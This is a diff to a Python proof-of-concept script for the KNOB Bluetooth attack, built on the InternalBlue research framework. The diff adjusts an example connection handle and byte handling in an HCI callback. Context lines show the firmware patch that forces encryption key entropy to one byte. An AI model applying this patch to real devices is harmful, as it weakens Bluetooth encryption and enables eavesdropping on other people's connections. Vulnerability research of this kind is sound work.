@@ -41,6 +41,7 @@ log.info("Installing patch which ensures that send_LMP_encryption_key_size_req i
 internalblue.writeMem(0x204147, b'\x01')  # global key entropy
 
 
+
 log.info("-----------------------KNOB-----------------------\n"
          "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
          "To monitor device behavior, continue on the CLI, ideally with diagnostic LMP mode.\n"
@@ -48,8 +49,8 @@ log.info("-----------------------KNOB-----------------------\n"
          "-----------------------KNOB-----------------------\n"
          "Automatically continuing on KNOB interface...\n"
          "Use the 'knob' command to *debug* the attack, i.e.:\n"
-         "    knob --hnd 0x0b\n"
-         "...shows the key size of handle 0x000b.\n")
+         "    knob --hnd 0x0c\n"
+         "...shows the key size of handle 0x000c.\n")
 
 
 class CmdKnob(cmd.Cmd):
@@ -80,12 +81,12 @@ def hciKnobCallback(record):
 
     if hcipkt.event_code == 0x0e:
         if u16(hcipkt.data[1:3]) == 0x1408:  # Read Encryption Key Size
-            if u8(hcipkt.data[3]) == 0x12:       # Error
+            if hcipkt.data[3] == 0x12:       # Error
                 log.info("No key size available.\n"
                          " - Did you already negotiate an encrypted connection?\n"
                          " - Did you choose the correct connection handle?\n")
             else:
-                log.info("HCI_Read_Encryption_Key_Size result for handle 0x%x: %x" % (u16(hcipkt.data[4:6]), u8(hcipkt.data[6])))
+                log.info("HCI_Read_Encryption_Key_Size result for handle 0x%x: %x" % (u16(hcipkt.data[4:6]), hcipkt.data[6]))
 
     return
 
